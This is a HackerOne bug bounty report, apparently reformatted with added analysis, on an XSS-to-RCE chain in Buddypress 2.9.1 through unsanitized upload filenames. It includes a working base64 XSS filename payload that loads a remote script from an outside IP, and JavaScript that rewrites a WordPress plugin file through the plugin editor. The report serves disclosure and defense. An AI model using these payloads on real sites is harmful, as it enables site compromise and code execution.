# Buddypress 2.9.1 - Unsanitized Filename in Upload Error Messages Leading to XSS and RCE

## Metadata
- **Source:** HackerOne
- **Report:** 263109 | https://hackerone.com/reports/263109
- **Submitted:** 2017-08-24
- **Reporter:** skansing
- **Program:** Buddypress
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (Stored/Reflected), Improper Input Validation, Remote Code Execution (via XSS chain)
- **CVEs:** None
- **Category:** web-api

## Summary
Buddypress 2.9.1 fails to sanitize filenames in error messages when users exceed maximum upload size limits for avatar and profile background images. This allows attackers to inject malicious JavaScript that executes in the admin context, potentially escalating to RCE through plugin file manipulation.

## Attack scenario
1. Attacker crafts a malicious filename containing JavaScript payload (e.g., img tag with onerror handler)
2. Attacker tricks admin user into uploading a file exceeding size limits via social engineering
3. Unsanitized filename appears in error message on vulnerable endpoints (/members/*/profile/change-avatar, /wp-admin/users.php?page=bp-profile-edit)
4. JavaScript payload executes in admin's browser session with full privileges
5. XSS payload loads external RCE script that opens plugin editor in iframe
6. Script modifies hello.php plugin file to contain malicious PHP code via DOM manipulation, achieving RCE

## Root cause
The application outputs user-supplied filename data directly into error messages without HTML encoding or sanitization. No `.html()` or equivalent escaping function is applied to filename values in error response handling.

## Attacker mindset
An attacker would recognize that admins frequently manage user profiles and upload images. By crafting specially named files and using social engineering, they can trick admins into triggering XSS in a high-privilege context. The attacker leverages admin-only capabilities (plugin editing) to convert XSS into persistent RCE.

## Defensive takeaways
- Always sanitize and HTML-encode all user-supplied data before rendering in HTML context, especially filenames and error messages
- Implement strict file upload validation on both client and server side
- Use context-aware output encoding functions (e.g., .html(), esc_html(), htmlspecialchars())
- Apply Content Security Policy (CSP) headers to prevent inline script execution and limit external script loading
- Restrict file upload functionality based on role; validate uploads server-side with filename whitelisting
- Implement integrity checks for plugin files and restrict plugin editor access to necessary users only
- Sanitize all error messages and user-facing content regardless of perceived risk

## Variant hunting
Search for other user upload features in Buddypress (document uploads, image galleries) that may lack filename sanitization
Audit all error/exception handling paths that output file-related metadata
Check for similar patterns in WordPress core and other plugins handling file uploads
Test other Buddypress versions for the same vulnerability pattern
Review other file size validation routines that generate user-facing error messages
Examine admin-only endpoints that accept file uploads and generate error responses

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1059

## Notes
This vulnerability requires admin privileges to achieve RCE, reducing immediate risk but critical due to privilege escalation potential. The attack chains XSS → XSSI → RCE cleverly, using base64 encoding to bypass character/length restrictions. The POC demonstrates sophisticated understanding of WordPress internals. Similar to CVE mentioned in report #203515, suggesting a pattern of insufficient output encoding in Buddypress error handling.

## Full report
<details><summary>Expand</summary>

# Description
This report is very similar to https://hackerone.com/bugs?subject=user&report_id=203515 so I will not go into too much details.

When uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.

The interfaces for upload that are vuln can be found at
domain.tld/members/USERNAME/profile/change-cover-image/
domain.tld/members/bbuser/profile/change-avatar/
domain.tld/wp-admin/users.php?page=bp-profile-edit
 
# POC
The POC explores a chain of XSS => XSSI => RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions

- Login as admin
- Goto `/wp-admin/users.php?page=bp-profile-edit`
- Upload a file with the following name (mentioned below) as admin for.

Filename 
`POC<img src=x onerror='document.write(atob("UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4="))'>`

The base64 data can be verified by
`btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');` in the browser conole.

This scripts loads the RCE script that changes the hello.php with <?php phpinfo() and redirect to it.
```
var i = document.createElement("iframe");
i.src = "http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php";
document.querySelector("body").appendChild(i);
setTimeout(function() {
  var p = "<?php phpinfo();"
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
```

# Suggested fix
Sanitize the error. I suspect it needs a run through `.html()` as in #203515


</details>

---
*Analysed by Claude on 2026-05-24*
